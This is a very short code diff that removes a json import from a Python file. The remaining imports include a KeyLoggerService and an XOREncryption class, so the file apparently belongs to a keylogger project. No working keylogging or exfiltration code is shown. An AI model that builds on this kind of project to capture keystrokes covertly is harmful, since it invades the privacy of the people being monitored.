@@ -1,4 +1,3 @@
-import json
 import time
 from KeyloggerService import KeyLoggerService
 from Encryption import XOREncryption
